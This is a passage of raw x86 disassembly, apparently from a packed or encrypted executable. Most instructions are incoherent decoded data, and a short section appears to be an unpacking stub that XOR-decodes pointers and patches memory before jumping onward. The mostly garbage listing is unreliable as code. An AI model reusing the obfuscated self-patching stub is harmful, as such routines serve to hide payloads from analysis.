  4142f7:	retf   0x8eb9
  4142fa:	sahf   
  4142fb:	fdivr  QWORD PTR [eax-0x66ca1429]
  414301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414303:	(bad)  
  414304:	ss icebp 
  414306:	dec    esi
  414307:	add    eax,DWORD PTR [esi+0x2bb93498]
  41430d:	or     al,0x3f
  41430f:	pop    esp
  414310:	or     al,0xfb
  414312:	popf   
  414313:	xchg   ecx,eax
  414314:	ret    
  414315:	loop   0x41435a
  414317:	jae    0x4142f2
  414319:	or     ch,BYTE PTR [eax+esi*4]
  41431c:	shl    DWORD PTR [ecx],0xfc
  41431f:	test   eax,0x5dd8e934
  414324:	out    dx,al
  414325:	pop    edi
  414326:	mov    gs,WORD PTR [edi-0x2d]
  414329:	(bad)  
  41432a:	stc    
  41432b:	mov    dl,BYTE PTR [esi]
  41432d:	test   dl,cl
  41432f:	mov    edx,0xec5d0c1f
  414334:	popf   
  414335:	jmp    DWORD PTR [esi+0x24]
  414338:	ret    
  414339:	ds (bad) 
  41433b:	sbb    eax,0xe6e70a46
  414340:	arpl   cx,dx
  414342:	nop
  414343:	xor    al,0xec
  414345:	repnz or edx,DWORD PTR [ebp-0x2d82367a]
  41434c:	xor    al,0x38
  41434e:	sub    bh,BYTE PTR [ebx]
  414350:	mov    esp,0x708aa2d4
  414355:	mov    dh,0x6f
  414357:	sub    esp,DWORD PTR [ebx-0x70]
  41435a:	adc    al,0xbf
  41435c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41435d:	popa   
  41435e:	sbb    eax,0xda7e7469
  414363:	add    BYTE PTR [ebx-0x225fe8da],ch
  414369:	(bad)  
  41436b:	sub    BYTE PTR [esi],dh
  41436d:	outs   dx,BYTE PTR ds:[esi]
  41436e:	ss mov dl,ch
  414371:	nop
  414372:	frstor [eax-0x2d]
  414375:	pusha  
  414376:	push   ss
  414377:	fimul  WORD PTR [edx+0x6c47a630]
  41437d:	and    eax,0x54568d79
  414382:	mov    edi,0x6526f71b
  414387:	in     eax,dx
  414388:	fdivr  st,st(0)
  41438a:	sbb    al,0x2e
  41438c:	xor    al,0x8a
  41438e:	ret    0x280b
  414391:	lahf   
  414392:	mov    esp,0x93bc46f0
  414397:	cmc    
  414398:	cld    
  414399:	out    0x71,al
  41439b:	dec    esi
  41439c:	popf   
  41439d:	mov    esi,0xe3e2576d
  4143a2:	loopne 0x41433a
  4143a4:	pushf  
  4143a5:	dec    esp
  4143a6:	jecxz  0x4143cd
  4143a8:	inc    edi
  4143a9:	add    ebx,DWORD PTR [esi+0x77]
  4143ac:	rcr    DWORD PTR [eax+0x0],cl
  4143af:	mov    dh,0xb5
  4143b1:	pushf  
  4143b2:	icebp  
  4143b3:	(bad)  
  4143b4:	mov    ds:0x3d13d53a,eax
  4143b9:	in     eax,0x50
  4143bb:	add    BYTE PTR [esi],0xbf
  4143be:	out    0x21,eax
  4143c0:	ja     0x41440f
  4143c2:	push   esi
  4143c3:	add    BYTE PTR [eax+0x7b99b4a6],dl
  4143c9:	inc    ebx
  4143ca:	scas   al,BYTE PTR es:[edi]
  4143cb:	mov    ch,0xe
  4143cd:	pushf  
  4143ce:	mov    dh,0x88
  4143d0:	pop    ds
  4143d1:	cld    
  4143d2:	retf   
  4143d3:	iret   
  4143d4:	mov    dh,bl
  4143d6:	xabort 0xe9
  4143d9:	adc    ebp,DWORD PTR [ebx]
  4143db:	dec    ebp
  4143dc:	xor    BYTE PTR [ebx-0x42835528],bl
  4143e2:	stos   DWORD PTR es:[edi],eax
  4143e3:	ror    esp,cl
  4143e5:	rcr    ah,1
  4143e7:	xlat   BYTE PTR ds:[ebx]
  4143e8:	mov    cl,0x7e
  4143ea:	dec    ebp
  4143eb:	jl     0x4143c1
  4143ed:	pushf  
  4143ee:	(bad)  
  4143ef:	mov    ?,WORD PTR [edi+0x6f173351]
  4143f5:	sub    DWORD PTR [edi],0x16
  4143f8:	mov    ch,0x82
  4143fa:	jecxz  0x414437
  4143fc:	popf   
  4143fd:	shl    BYTE PTR [eax-0x4],0x64
  414401:	daa    
  414402:	pop    es
  414403:	or     ebx,ecx
  414405:	out    0x81,al
  414407:	scas   al,BYTE PTR es:[edi]
  414408:	stos   BYTE PTR es:[edi],al
  414409:	(bad)  
  41440a:	sub    ebx,eax
  41440c:	jp     0x41447c
  41440e:	stc    
  41440f:	div    edx
  414411:	inc    ebx
  414412:	enter  0xfb2a,0xb3
  414416:	cs mov bh,0x9d
  414419:	inc    ecx
  41441a:	push   edx
  41441b:	mov    ecx,0x27cd6e71
  414420:	retf   0x3341
  414423:	fwait
  414424:	push   0xffffffe6
  414426:	lods   eax,DWORD PTR ds:[esi]
  414427:	jo     0x4143b1
  414429:	les    ebx,FWORD PTR [edi]
  41442b:	push   ebp
  41442c:	pop    ecx
  41442d:	jne    0x41441e
  41442f:	nop
  414430:	mov    ah,0x63
  414432:	push   esi
  414433:	pop    ds
  414434:	dec    esi
  414435:	or     BYTE PTR [edi+0x2befffe0],bl
  41443b:	or     edi,DWORD PTR [ebp+0x5fe20ac5]
  414441:	add    al,0x1c
  414443:	inc    eax
  414444:	sub    ebp,DWORD PTR [eax+0x79]
  414447:	xor    edi,esi
  414449:	in     eax,dx
  41444a:	outs   dx,DWORD PTR ds:[esi]
  41444b:	and    ebx,DWORD PTR [edi]
  41444d:	dec    esi
  41444e:	jmp    0xe7196e14
  414453:	mov    ebx,0xc070a71f
  414458:	(bad)  
  414459:	or     al,0xdd
  41445b:	mov    esp,0x9bf61e60
  414460:	xchg   esp,eax
  414461:	jnp    0x414443
  414463:	mov    cl,BYTE PTR [eax-0x1532188f]
  414469:	scas   eax,DWORD PTR es:[edi]
  41446a:	popa   
  41446b:	clc    
  41446c:	mov    eax,ds:0x976e5c7d
  414471:	test   BYTE PTR [ebx+0x2f68b6b6],bh
  414477:	pop    ss
  414478:	sbb    dl,BYTE PTR [edi-0x603b0899]
  41447e:	ffree  st(0)
  414480:	in     al,0xa8
  414482:	cmp    edi,eax
  414484:	mov    eax,0x30570f5b
  414489:	adc    DWORD PTR [edi+0x46d22188],edx
  41448f:	cmp    al,0x7c
  414491:	sbb    edx,edx
  414493:	xor    al,0xf7
  414495:	and    DWORD PTR [edx],ecx
  414497:	sar    BYTE PTR ds:0xf635455e,1
  41449d:	and    ebp,DWORD PTR [edi]
  41449f:	inc    edx
  4144a0:	shl    BYTE PTR [ecx+0x1a1e5b61],1
  4144a6:	rol    DWORD PTR [edx],0x1d
  4144a9:	mov    al,0xcd
  4144ab:	dec    ebp
  4144ac:	xchg   esp,eax
  4144ad:	cdq    
  4144ae:	push   cs
  4144af:	cld    
  4144b0:	mov    ecx,0xc2ba4ce4
  4144b5:	lock xor DWORD PTR [ebp-0x3d05e2a6],eax
  4144bc:	leave  
  4144bd:	add    al,0x25
  4144bf:	arpl   WORD PTR [ebp+0x2c5f4211],sp
  4144c5:	test   DWORD PTR [eax+0x34],ebx
  4144c8:	outs   dx,DWORD PTR ds:[esi]
  4144c9:	ror    edi,0x68
  4144cc:	fdiv   QWORD PTR [eax]
  4144ce:	mov    ebp,0x2e0b75a
  4144d3:	test   al,0x40
  4144d5:	ins    DWORD PTR es:[edi],dx
  4144d6:	xor    esi,DWORD PTR [ebx]
  4144d8:	call   0x6b6363d0
  4144dd:	ds fwait
  4144df:	in     al,0x3d
  4144e1:	push   cs
  4144e2:	test   DWORD PTR [edi+0x59107109],0x498be288
  4144ec:	js     0x41454f
  4144ee:	xchg   edi,eax
  4144ef:	(bad)  
  4144f0:	jecxz  0x4144cd
  4144f2:	pushf  
  4144f3:	sub    DWORD PTR [esi-0x3d1384df],edi
  4144f9:	call   0x25e9:0x30940e62
  414500:	mov    al,0xf1
  414502:	adc    eax,0x3792baf2
  414507:	adc    al,0x7a
  414509:	pop    ecx
  41450a:	inc    ebp
  41450b:	shr    BYTE PTR [ebp+0x1c],cl
  41450e:	shr    BYTE PTR [edi+0x4f85ce1a],cl
  414514:	adc    al,BYTE PTR [edx+0x4]
  414517:	mov    esp,0xebced306
  41451c:	inc    esp
  41451d:	xchg   edi,eax
  41451e:	cmc    
  41451f:	loop   0x41453c
  414521:	icebp  
  414522:	nop
  414523:	dec    eax
  414524:	js     0x4144df
  414526:	dec    ebx
  414527:	loope  0x4144c8
  414529:	jge    0x4144fd
  41452b:	push   ecx
  41452c:	fwait
  41452d:	xlat   BYTE PTR ds:[ebx]
  41452e:	xor    dh,BYTE PTR [ebp+0x3262b8f2]
  414534:	mov    esi,0x4b17e995
  414539:	retf   0xc681
  41453c:	in     al,0x37
  41453e:	sar    dl,cl
  414540:	sbb    al,BYTE PTR [ebp+0x26ce8aed]
  414546:	and    al,0xe
  414548:	mov    dl,0xd4
  41454a:	mov    eax,ds:0x63985585
  41454f:	leave  
  414550:	inc    eax
  414551:	add    BYTE PTR [ebx+0x52],bl
  414554:	and    DWORD PTR [ebx],edx
  414556:	inc    edi
  414557:	lds    edi,FWORD PTR [edx]
  414559:	mov    edx,0x6ddb9447
  41455e:	int    0x33
  414560:	sub    BYTE PTR [ecx],dl
  414562:	lods   eax,DWORD PTR ds:[esi]
  414563:	inc    esi
  414564:	push   ecx
  414565:	jne    0x4145cc
  414567:	inc    esi
  414568:	lods   eax,DWORD PTR ds:[esi]
  414569:	jmp    0x2bb:0x828b89d
  414570:	or     eax,0xf8a13bcf
  414575:	pop    esi
  414576:	sar    DWORD PTR fs:[esi+0x42bd125d],cl
  41457d:	jmp    0x414584
  41457f:	jp     0x4145f8
  414581:	out    0xf0,eax
  414583:	push   eax
  414584:	and    eax,0x62037f6f
  414589:	mov    DWORD PTR [edx-0x56],ecx
  41458c:	inc    ecx
  41458d:	outs   dx,DWORD PTR ds:[esi]
  41458e:	mov    edx,0x24177df7
  414593:	or     DWORD PTR [esi-0x13],edx
  414596:	jecxz  0x41453c
  414598:	sbb    DWORD PTR [eax],edx
  41459a:	fwait
  41459b:	stos   BYTE PTR es:[edi],al
  41459c:	push   ebp
  41459d:	push   ebx
  41459e:	adc    al,0x58
  4145a0:	or     edx,ebx
  4145a2:	call   0xd891:0x9139394f
  4145a9:	stos   DWORD PTR es:[edi],eax
  4145aa:	test   eax,0x43b92ba5
  4145af:	loopne 0x4145c3
  4145b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145b2:	push   edx
  4145b3:	stos   BYTE PTR es:[edi],al
  4145b4:	mov    ecx,0xa94b25e9
  4145b9:	push   edi
  4145ba:	sbb    dl,BYTE PTR [edx+0x19606605]
  4145c0:	bound  ecx,QWORD PTR ds:0x4d48b7d6
  4145c6:	scas   eax,DWORD PTR es:[edi]
  4145c7:	cmp    ch,BYTE PTR [ebp+esi*8-0x17066c8f]
  4145ce:	out    dx,al
  4145cf:	xor    eax,0xa6503963
  4145d4:	enter  0x7c25,0x4f
  4145d8:	repz sub DWORD PTR [eax+ebp*8],esp
  4145dc:	cmp    al,0x4e
  4145de:	xchg   esi,eax
  4145df:	cli    
  4145e0:	loope  0x4145cf
  4145e2:	scas   al,BYTE PTR es:[edi]
  4145e3:	inc    ebp
  4145e4:	aas    
  4145e5:	mov    ecx,0xb3281906
  4145ea:	cmp    DWORD PTR [edi+0x42],esi
  4145ed:	dec    edx
  4145ee:	jae    0x4145de
  4145f0:	dec    ebx
  4145f1:	jmp    0x3a2d:0xedf30723
  4145f8:	mov    bl,0x8e
  4145fa:	mov    ecx,0x49ee2f23
  4145ff:	inc    edi
  414600:	(bad)  
  414601:	cld    
  414602:	out    0x42,eax
  414604:	xchg   edi,eax
  414605:	pop    ebx
  414606:	pop    edx
  414607:	imul   ecx,DWORD PTR [esp+ebx*2+0x698b3ec1],0x1b
  41460f:	bound  edi,QWORD PTR [eax-0x60]
  414612:	xchg   DWORD PTR [ecx],ebx
  414614:	mov    ds:0xded4b835,eax
  414619:	adc    eax,0x8b5f670a
  41461e:	sub    DWORD PTR [ecx+0x6b],ebx
  414621:	cdq    
  414622:	into   
  414623:	push   cs
  414624:	push   edi
  414625:	dec    ecx
  414626:	xor    BYTE PTR [ecx+edx*8-0x1c951d55],al
  41462d:	stc    
  41462e:	outs   dx,BYTE PTR ds:[esi]
  41462f:	js     0x4145de
  414631:	aas    
  414632:	fadd   DWORD PTR [edx+0x60c314fb]
  414638:	pop    ds
  414639:	ss stos DWORD PTR es:[edi],eax
  41463b:	(bad)  
  41463c:	jle    0x41469e
  41463e:	gs enter 0x47f2,0xb4
  414643:	enter  0x3e7d,0x4a
  414647:	mov    eax,ds:0x16f92ecf
  41464c:	xlat   BYTE PTR ds:[ebx]
  41464d:	outs   dx,BYTE PTR ds:[esi]
  41464e:	stc    
  41464f:	and    al,0x84
  414651:	adc    BYTE PTR [esi+edi*1+0x77],cl
  414655:	mov    BYTE PTR [ebp+0x5af4477a],ah
  41465b:	in     al,0xca
  41465d:	push   ss
  41465e:	stos   BYTE PTR es:[edi],al
  41465f:	xor    BYTE PTR [edi+ebx*1],bh
  414662:	mov    cl,0xf9
  414664:	loop   0x414689
  414666:	or     DWORD PTR [ebx+0x39],edx
  414669:	mov    edx,0x338f0f81
  41466e:	mov    BYTE PTR [ebx],0xc7
  414671:	push   eax
  414672:	mov    eax,DWORD PTR [ebp-0x1c]
  414675:	xor    eax,esi
  414677:	add    eax,edi
  414679:	push   eax
  41467a:	mov    eax,DWORD PTR [ebp-0x10]
  41467d:	xor    eax,esi
  41467f:	add    eax,edi
  414681:	push   eax
  414682:	lea    eax,[ebp-0x90]
  414688:	push   eax
  414689:	push   DWORD PTR [ebp-0x20]
  41468c:	push   DWORD PTR [ebp-0x30]
  41468f:	call   0x40f89f
  414694:	test   eax,eax
  414696:	je     0x4146c7
  41469c:	lea    eax,[ebp-0x90]
  4146a2:	push   eax
  4146a3:	mov    eax,DWORD PTR [ebp-0x30]
  4146a6:	xor    eax,esi
  4146a8:	add    eax,edi
  4146aa:	push   eax
  4146ab:	mov    eax,DWORD PTR [ebp-0x2c]
  4146ae:	add    eax,0xaa
  4146b3:	push   eax
  4146b4:	mov    eax,DWORD PTR [ebp-0x2c]
  4146b7:	mov    eax,DWORD PTR [eax+0x198]
  4146bd:	push   DWORD PTR [eax]
  4146bf:	call   0x40867e
  4146c4:	mov    DWORD PTR [ebp-0x40],eax
  4146c7:	lea    eax,[ebp+0x4]
  4146ca:	mov    DWORD PTR [ebp-0x34],eax
  4146cd:	mov    eax,DWORD PTR [ebp-0x8]
  4146d0:	mov    eax,DWORD PTR [eax]
  4146d2:	mov    eax,DWORD PTR [eax]
  4146d4:	mov    eax,DWORD PTR [eax]
  4146d6:	test   eax,eax
  4146d8:	je     0x416aa8
  4146de:	lea    eax,[ebp-0xc]
  4146e1:	mov    DWORD PTR [ebp-0x4c],eax
  4146e4:	mov    eax,DWORD PTR [ebp-0x3c]
  4146e7:	mov    DWORD PTR [ebp-0xc],eax
  4146ea:	mov    eax,DWORD PTR [ebp-0x8]
  4146ed:	mov    eax,DWORD PTR [eax]
  4146ef:	mov    eax,DWORD PTR [eax]
  4146f1:	mov    eax,DWORD PTR [eax]
  4146f3:	sub    DWORD PTR [ebp-0xc],eax
  4146f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4146f9:	xor    ecx,esi
  4146fb:	mov    eax,0xffcd8d25
  414700:	sub    eax,ecx
  414702:	add    DWORD PTR [ebp-0xc],eax
  414705:	mov    eax,DWORD PTR [ebp-0xc]
  414708:	mov    ecx,DWORD PTR [ebp-0x8]
  41470b:	mov    ecx,DWORD PTR [ecx]
  41470d:	mov    ecx,DWORD PTR [ecx]
  41470f:	mov    ecx,DWORD PTR [ecx]
  414711:	mov    DWORD PTR [ecx+0x1],eax
  414714:	mov    al,BYTE PTR [ebp-0x1]
  414717:	mov    ecx,DWORD PTR [ebp-0x8]
  41471a:	mov    ecx,DWORD PTR [ecx]
  41471c:	mov    ecx,DWORD PTR [ecx]
  41471e:	mov    ecx,DWORD PTR [ecx]
  414720:	push   DWORD PTR [ebp-0x2c]
  414723:	xor    al,0x6f
  414725:	sub    al,0xd
  414727:	mov    BYTE PTR [ecx],al
  414729:	mov    eax,ds:0x423e6e
  41472e:	push   DWORD PTR [eax]
  414730:	push   DWORD PTR ds:0x4240ca
  414736:	push   DWORD PTR ds:0x423e76
  41473c:	push   DWORD PTR ds:0x4240aa
  414742:	push   DWORD PTR ds:0x424132
  414748:	push   DWORD PTR [ebp-0x30]
  41474b:	jmp    0x416a9a
  414750:	jp     0x414751
  414752:	int    0x35
  414754:	ret    
  414755:	add    ecx,DWORD PTR [edx-0x41938645]
  41475b:	pop    ss
  41475c:	ret    0xa62
  41475f:	repz mov WORD PTR [eax+0x61],cs
  414763:	bound  edx,QWORD PTR [eax+0x5f]
  414766:	bound  esp,QWORD PTR [edx-0xe]
  414769:	push   eax
  41476a:	loope  0x41478e
  41476c:	fcomp  st(4)
  41476e:	in     eax,dx
  41476f:	dec    eax
  414770:	push   ecx
  414771:	cmp    bl,BYTE PTR [eax+0x4129a03b]
  414777:	mov    esp,DWORD PTR [ebx+0x559a7225]
  41477d:	ja     0x41474b
  41477f:	js     0x414776
  414781:	std    
  414782:	dec    esp
  414783:	dec    ebp
  414784:	into   
  414785:	cmp    eax,ebx
  414787:	scas   al,BYTE PTR es:[edi]
  414788:	or     DWORD PTR [ecx+ebx*8],0x5b265e95
  41478f:	lds    esp,FWORD PTR [esi]
  414791:	sbb    al,0x87
  414793:	inc    ebp
  414794:	sbb    ebx,DWORD PTR [edi+0x2f]
  414797:	add    DWORD PTR ds:0xe0e5f7af,0x53e3c16b
  4147a1:	dec    ecx
  4147a2:	icebp  
  4147a3:	cmp    esp,0xfcecd8b9
  4147a9:	add    al,dl
  4147ab:	push   es
  4147ac:	dec    ebx
  4147ad:	ret    
  4147ae:	aad    0x32
  4147b0:	dec    edx
  4147b1:	add    al,BYTE PTR [edi-0xbc58cd7]
  4147b7:	jmp    0x65fe:0x98eeae92
  4147be:	mov    edi,0x20763a06
  4147c3:	push   ebx
  4147c4:	add    ebp,DWORD PTR ds:0x257f3643
  4147ca:	fisttp QWORD PTR [ecx]
  4147cc:	repz push edi
  4147ce:	cmp    eax,0xef30f8c9
  4147d3:	jmp    0x3f2e3071
  4147d8:	push   ds
  4147d9:	jae    0x414825
  4147db:	push   es
  4147dc:	push   es
  4147dd:	(bad)  
  4147de:	xor    edi,DWORD PTR [esi-0x19]
  4147e1:	ins    DWORD PTR es:[edi],dx
  4147e2:	inc    edi
  4147e3:	cmc    
  4147e4:	retf   0x9a28
  4147e7:	mov    cl,BYTE PTR [ebp+0x4b]
  4147ea:	add    bl,BYTE PTR [ebp+0x17]
  4147ed:	add    DWORD PTR [esi+0xa],ecx
  4147f0:	and    eax,0x309739fd
  4147f5:	sahf   
  4147f6:	ror    DWORD PTR [esi+eax*8],1
  4147f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147fa:	or     al,0xa5
  4147fc:	jae    0x414817
  4147fe:	xchg   ebx,eax
  4147ff:	(bad)  
  414800:	in     al,0xf1
  414802:	clc    
  414803:	out    dx,al
  414804:	jecxz  0x41486a
  414806:	aad    0xe4
  414808:	push   ebp
  414809:	test   BYTE PTR [ebx+edx*8+0x764e12ce],ah
  414810:	cmp    dl,BYTE PTR [edi]
  414812:	add    cl,BYTE PTR [ecx-0x7e]
  414815:	imul   ebp,DWORD PTR [ecx],0x1a47d8a
  41481b:	sar    DWORD PTR [ebp+0x4c4eec53],0x9f
  414822:	mov    ah,BYTE PTR [edx-0x2830e211]
  414828:	ret    
  414829:	das    
  41482a:	lea    ebp,[esi-0x4bf9a93f]
  414830:	sbb    DWORD PTR [ebp-0x21d7573b],ebp
  414836:	jmp    0x96aaf8ce
  41483b:	bound  ebp,QWORD PTR [edi-0x78ddcba7]
  414841:	add    DWORD PTR [edx],0x76
  414844:	jmp    DWORD PTR [esi-0x5eaa35ca]
  41484a:	imul   edx,DWORD PTR [eax],0x4c248c8b
  414850:	mov    DWORD PTR [ecx],eax
  414852:	and    bh,BYTE PTR [edx]
  414854:	adc    DWORD PTR [edx-0x5f3e2a0],0xfdf52acc
  41485e:	mov    edi,0x8dbf6928
  414863:	mov    bl,0x8e
  414865:	jmp    0x957cb8a
  41486a:	inc    edi
  41486b:	mov    esp,0xad0a8d55
  414870:	je     0x4147fd
  414872:	inc    esp
  414873:	mov    ah,0x5e
  414875:	fcomp  DWORD PTR [esi-0x23]
  414878:	push   edx
  414879:	jl     0x4148f1
  41487b:	xor    edi,ebp
  41487d:	(bad)  
  41487e:	push   edx
  41487f:	add    ch,BYTE PTR [edi-0x6f]
  414882:	in     al,dx
  414883:	dec    edx
  414884:	add    DWORD PTR [esi-0x5c],0xe37cb29b
  41488b:	sub    cl,BYTE PTR [eax-0x53]
  41488e:	inc    ebx
  41488f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414890:	les    edi,FWORD PTR [esi-0x12]
  414893:	(bad)  
  414895:	push   es
  414896:	sar    DWORD PTR [edx+0x4e],cl
  414899:	dec    ebx
  41489a:	int    0x77
  41489c:	sbb    DWORD PTR ds:0x427d91a0,0xffffffb3
  4148a3:	sahf   
  4148a4:	or     DWORD PTR [ebx-0x1e40f3b6],0xffffffe0
  4148ab:	dec    ecx
  4148ac:	sub    ch,BYTE PTR ds:0x4d84f11a
  4148b2:	mov    dl,BYTE PTR [ebp+eax*1-0x243725b9]
  4148b9:	pushf  
  4148ba:	out    dx,eax
  4148bb:	scas   al,BYTE PTR es:[edi]
  4148bc:	inc    ebp
  4148bd:	outs   dx,DWORD PTR ds:[esi]
  4148be:	cmp    eax,esi
  4148c0:	test   BYTE PTR [ebx-0x26244298],0xda
  4148c7:	xchg   BYTE PTR [esi-0x30],bl
  4148ca:	push   ecx
  4148cb:	mov    eax,0x23c7f03e
  4148d0:	ret    0x3c35
  4148d3:	sahf   
  4148d4:	sbb    al,0x70
  4148d6:	push   ss
  4148d7:	add    eax,0xcec8fdab
  4148dc:	fisubr WORD PTR [edx]
  4148de:	or     esp,esi
  4148e0:	adc    eax,edx
  4148e2:	jle    0x41490f
  4148e4:	push   ss
  4148e5:	sub    DWORD PTR [edx+0xdaafa41],0xffffffae
  4148ec:	pop    eax
  4148ed:	(bad)  
  4148ee:	test   DWORD PTR [edx],0x773cbd78
  4148f4:	dec    esi
  4148f5:	in     eax,dx
  4148f6:	rcl    BYTE PTR [esi+0x3785007e],0xe0
  4148fd:	dec    edi
  4148fe:	jns    0x4148c4
  414900:	or     BYTE PTR [esi],bl
  414902:	bound  ecx,QWORD PTR ds:0x63cc59bc
  414908:	pop    ebx
  414909:	test   BYTE PTR [esi+eax*4],ch
  41490c:	rcr    DWORD PTR [esi],0x41
  41490f:	rol    edx,1
  414911:	xlat   BYTE PTR ds:[ebx]
  414912:	sub    ebp,DWORD PTR [ecx+0x2ee01d31]
  414918:	xchg   ebp,eax
  414919:	hlt    
  41491a:	mov    ds:0xc174576d,al
  41491f:	shr    BYTE PTR [ebx+0x6f4cd5c8],1
  414925:	jl     0x414929
  414927:	adc    BYTE PTR [edi-0x51],dh
  41492a:	inc    ecx
  41492b:	mov    bh,BYTE PTR [ebx+0x42]
  41492e:	in     eax,dx
  41492f:	xlat   BYTE PTR ds:[ebx]
  414930:	jp     0x4149a3
  414932:	fstp   DWORD PTR [esi]
  414934:	js     0x41495d
  414936:	test   eax,0x7b37a9fa
  41493b:	dec    ecx
  41493c:	ds jns 0x414972
  41493f:	mov    esp,0x81312f87
  414944:	std    
  414945:	je     0x4148e1
  414947:	jmp    0x217e1e1a
  41494c:	aad    0xe0
  41494e:	and    esi,DWORD PTR [ebx]
  414950:	aam    0x8f
  414952:	data16 sub al,0x24
  414955:	adc    DWORD PTR [edx-0x6e],edx
  414958:	fwait
  414959:	mov    ds:0xaedd3df2,eax
  41495e:	repnz stos DWORD PTR es:[edi],eax
  414960:	int3   
  414961:	jle    0x4149a7
  414963:	out    dx,al
  414964:	nop
  414965:	mov    ebp,DWORD PTR [eax-0x27]
  414968:	fs popf 
  41496a:	jmp    0x41490c
  41496c:	jb     0x414928
  41496e:	loop   0x414930
  414970:	sahf   
  414971:	(bad)  
  414972:	push   edi
  414973:	fnstenv [esi-0x68]
  414976:	test   DWORD PTR [ebx-0x41d2ec24],ebp
  41497c:	xchg   edi,eax
  41497d:	push   ecx
  41497e:	dec    esi
  41497f:	inc    esp
  414980:	(bad)  
  414982:	inc    ecx
  414983:	sbb    eax,0x924db21e
  414988:	push   0x4fa2a86c
  41498d:	pop    eax
  41498e:	out    0x4e,eax
  414990:	adc    al,0xe3
  414992:	mov    ebp,0xae9a7745
  414997:	xchg   BYTE PTR [ecx-0x5c],bl
  41499a:	cmp    DWORD PTR [edx+ecx*2-0x2e0105b8],0x4e
  4149a2:	data16 jg 0x414a1e
  4149a5:	daa    
  4149a6:	shr    ch,1
  4149a8:	ret    0xbe2b
  4149ab:	jg     0x4149ed
  4149ad:	call   0x5d1f5699
  4149b2:	or     DWORD PTR [eax+ecx*2+0x7b],0x24ecf983
  4149ba:	adc    DWORD PTR [edi],0x782628e0
  4149c0:	push   ds
  4149c1:	ucomiss xmm1,DWORD PTR [eax]
  4149c4:	jl     0x4149f7
  4149c6:	cs xchg ebx,eax
  4149c8:	pusha  
  4149c9:	push   ebx
  4149ca:	outs   dx,DWORD PTR ds:[esi]
  4149cb:	ds int 0x3
  4149ce:	jne    0x414965
  4149d0:	fsub   QWORD PTR [edi-0x52cea793]
  4149d6:	mov    ds,WORD PTR [edx+0x41]
  4149d9:	mov    ch,0x5c
  4149db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149dc:	(bad)  
  4149dd:	cwde   
  4149de:	std    
  4149df:	xor    eax,0x84494ba6
  4149e4:	dec    esp
  4149e5:	push   es
  4149e6:	push   eax
  4149e7:	push   edi
  4149e8:	sbb    edx,eax
  4149ea:	(bad)  
  4149eb:	in     al,dx
  4149ec:	mov    ah,0x35
  4149ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149ef:	add    ebp,esp
  4149f1:	aas    
  4149f2:	cmp    al,BYTE PTR [esi]
  4149f4:	jecxz  0x41499c
  4149f6:	inc    esi
  4149f7:	stos   BYTE PTR es:[edi],al
  4149f8:	test   BYTE PTR [ebx-0x57],0x87
  4149fc:	push   0xffffff86
  4149fe:	mov    ecx,0x8cb1867d
  414a03:	mov    WORD PTR [ebp+0x38decdd1],cs
  414a09:	or     ch,BYTE PTR [ecx+ebx*1+0x2f]
  414a0d:	xchg   BYTE PTR [esi+eax*8-0x7c98efd9],bl
  414a14:	fisttp DWORD PTR [ecx-0x6e]
  414a17:	pop    esi
  414a18:	and    BYTE PTR [eax],ah
  414a1a:	(bad)  
  414a1b:	mov    eax,ds:0x2c3cf10e
  414a20:	popf   
  414a21:	dec    edx
  414a22:	mov    BYTE PTR [ebp+0x60],bl
  414a25:	(bad)  
  414a26:	in     eax,0xd0
  414a28:	xchg   esp,eax
  414a29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a2a:	pop    ss
  414a2b:	and    al,0x8f
  414a2d:	std    
  414a2e:	sub    BYTE PTR [eax],cl
  414a30:	xor    eax,0xb57a9217
  414a35:	test   ebp,0x6f78cc1d
  414a3b:	shl    ebx,0xdf
  414a3e:	call   0x58ad:0x5baaea55
  414a45:	div    cl
  414a47:	pop    edi
  414a48:	jle    0x4149ec
  414a4a:	xor    eax,0xfa01bfff
  414a4f:	mov    eax,ds:0xeba8408e
  414a54:	sub    dh,ch
  414a56:	xchg   edi,eax
  414a57:	xor    al,0xc0
  414a59:	icebp  
  414a5a:	jno    0x414a4f
  414a5c:	outs   dx,BYTE PTR ds:[esi]
  414a5d:	mov    bh,0x1c
  414a5f:	push   esi
  414a60:	cs pusha 
  414a62:	nop
  414a63:	sub    eax,DWORD PTR [eax]
  414a65:	popa   
  414a66:	dec    ebx
  414a67:	mov    ebp,0x82e09d70
  414a6c:	lahf   
  414a6d:	sub    BYTE PTR [esi-0x5d],0xb8
  414a71:	adc    eax,0xc478248a
  414a76:	or     eax,0xf6cd4752
  414a7b:	jnp    0x414a85
  414a7d:	xor    DWORD PTR [esi],ebx
  414a7f:	cwde   
  414a80:	sbb    eax,0x56e912e6
  414a85:	jae    0x414ac7
  414a87:	das    
  414a88:	and    eax,0x9d6eb5b6
  414a8d:	adc    eax,0xe014921
  414a92:	and    DWORD PTR [ebx+eiz*1],eax
  414a95:	adc    al,0x1c
  414a97:	addr16 dec edx
  414a99:	jmp    0x94da:0x70219e06
  414aa0:	cmp    edx,DWORD PTR [esi+0x2ea0766c]
  414aa6:	pusha  
  414aa7:	fistp  WORD PTR [edx]
  414aa9:	out    dx,al
  414aaa:	gs es stos DWORD PTR es:[edi],eax
  414aad:	pop    ecx
  414aae:	adc    ebp,esp
  414ab0:	mov    eax,ds:0xb20cc799
  414ab5:	adc    al,0x7d
  414ab7:	push   0xffffffa9
  414ab9:	xchg   edx,eax
  414aba:	fs jle 0x414a6d
  414abd:	aas    
  414abe:	sub    BYTE PTR ds:0x3feb46b8,al
  414ac4:	add    al,0xbf
  414ac6:	outs   dx,DWORD PTR ds:[esi]
  414ac7:	pop    ds
  414ac8:	test   DWORD PTR [ebp+ebx*8+0x526a4eb7],eax
  414acf:	in     al,0x50
  414ad1:	(bad)
  414ad4:	rcr    DWORD PTR [eax-0x6e],1
  414ad7:	inc    eax
  414ad8:	dec    ecx
  414ad9:	xchg   edi,eax
  414ada:	pop    esi
  414adb:	in     eax,0x55
  414add:	or     dl,dl
  414adf:	jl     0x414a6f
